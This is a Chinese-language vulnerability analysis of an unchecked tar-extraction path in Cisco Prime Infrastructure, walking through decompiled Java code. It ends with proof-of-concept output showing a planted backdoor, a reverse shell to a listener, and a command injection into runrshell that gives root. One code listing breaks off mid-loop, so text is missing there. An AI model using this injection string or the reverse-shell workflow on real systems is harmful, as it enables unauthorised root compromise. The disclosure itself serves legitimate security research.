    {
      ...
      public boolean extractArchive(boolean compress, String archveName, InputStream istream, String userDir)
      {
        this.archiveName = archveName;
        this.compressed = compress;
        File destDir = new File(userDir);
        if (istream != null) {
          AesLogImpl.getInstance().trace1(128, "Extract archive from stream  to directory " + userDir);
        } else {
          AesLogImpl.getInstance().trace1(128, "Extract archive " + this.archiveName + " to directory " + userDir);
        }
        if ((!destDir.exists()) && 
          (!destDir.mkdirs()))
        {
          destDir = null;
          AesLogImpl.getInstance().error1(128, "Error while creating destination dir=" + userDir + " Giving up extraction of archive " + this.archiveName);
          return false;
        }
        result = false;
        if (destDir != null) {
          try
          {
            setupReadArchive(istream);                                  // 15
            this.archive.extractContents(destDir);                      // 17
            return true;
          }
[15]处代码首先会调用`setupReadArchive`函数。这很重要，因为紧接着`archive`变量在`TarArchive`类中被实例化[16]。
    private boolean setupReadArchive(InputStream istream)
       throws IOException
     {
       if ((this.archiveName != null) && (istream == null)) {
         try
         {
           this.inStream = new FileInputStream(this.archiveName);
         }
         catch (IOException ex)
         {
           this.inStream = null;
           return false;
         }
       } else {
         this.inStream = istream;
       }
       if (this.inStream != null) {
         if (this.compressed)
         {
           try
           {
             this.inStream = new GZIPInputStream(this.inStream);
           }
           catch (IOException ex)
           {
             this.inStream = null;
           }
           if (this.inStream != null) {
             this.archive = new TarArchive(this.inStream, 10240);              // 16
           }
         }
         else
         {
           this.archive = new TarArchive(this.inStream, 10240);
         }
       }
       if (this.archive != null) {
         this.archive.setDebug(this.debug);
       }
       return this.archive != null;
     }
    [17]处，代码会调用TarArchive类的extractContents函数。
    extractContents( File destDir )
      throws IOException, InvalidHeaderException
      {
      for ( ; ; )
        {
        TarEntry entry = this.tarIn.getNextEntry();
        if ( entry == null )
          {
          if ( this.debug )
            {
            System.err.println( "READ EOF RECORD" );
            }
          break;
          }
        this.extractEntry( destDir, entry );                      // 18
        }
      }
继续跟进，[18]处代码负责提取出条目。我们可以看到这里没有任何检查，随意提取tar档案文件。
    try {
      boolean asciiTrans = false;
      FileOutputStream out =
        new FileOutputStream( destFile );                   // 19
      ...
      for ( ; ; )
        {
        int numRead = this.tarIn.read( rdbuf );
        if ( numRead == -1 )
          break;
        if ( asciiTrans )
          {
          for ( int off = 0, b = 0 ; b  
    (+) eg: ./poc.py 192.168.100.123 192.168.100.2:4444
    saturn:~ mr_me$ ./poc.py 192.168.100.123 192.168.100.2:4444
    (+) planted backdoor!
    (+) starting handler on port 4444
    (+) connection from 192.168.100.123
    (+) pop thy shell!
    python -c 'import pty; pty.spawn("/bin/bash")'
    [prime@piconsole CSCOlumos]$ /opt/CSCOlumos/bin/runrshell '" && /bin/sh #'
    /opt/CSCOlumos/bin/runrshell '" && /bin/sh #'
    sh-4.1# /usr/bin/id
    /usr/bin/id
    uid=0(root) gid=0(root) groups=0(root),110(gadmin),201(xmpdba) context=system_u:system_r:unconfined_java_t:s0
[这里](https://srcincite.io/pocs/src-2019-0034.py.txt)有完整的poc文档，你可以下载到本地分析参考。
### 小结
虽然这个漏洞经受住了思科以及其他研究人员的多次代码审计的考验，但我认为是需要配置为高可用性，并且在一个组件中触发的缘故。有时候安全研究者需要费一些时间去好好配置实验环境，以便更好地工作。
###  参考